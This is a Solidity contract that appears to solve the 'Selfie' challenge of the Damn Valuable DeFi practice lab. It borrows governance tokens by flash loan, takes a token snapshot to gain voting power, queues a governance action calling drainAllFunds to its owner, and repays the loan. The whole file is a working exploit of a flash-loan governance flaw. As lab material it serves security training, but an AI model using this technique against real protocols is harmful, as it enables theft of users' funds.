// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Ownable} from "../../../lib/openzeppelin-contracts/contracts/access/Ownable.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract Attack is Ownable {
    SelfiePool private selfiePool;
    SimpleGovernance private governance;
    uint256 private proposalId;

    constructor(address _selfiePool, address _governance) {
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
    }

    function executeFlashLoan(uint256 _amount) external onlyOwner {
        // execute the flashloan.
        selfiePool.flashLoan(_amount);
    }

    function executeProposal() external onlyOwner {
        // execute the proposal.
        governance.executeAction(proposalId);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        // check if the caller is the selfie pool.
        require(msg.sender == address(selfiePool), "not the pool");

        // make a new checkpoint snapshot
        DamnValuableTokenSnapshot(_token).snapshot();

        // Queue the proposal.
        proposalId =
            governance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner()), 0);

        // repay the flashloan
        DamnValuableTokenSnapshot(_token).transfer(address(selfiePool), _amount);
    }
}
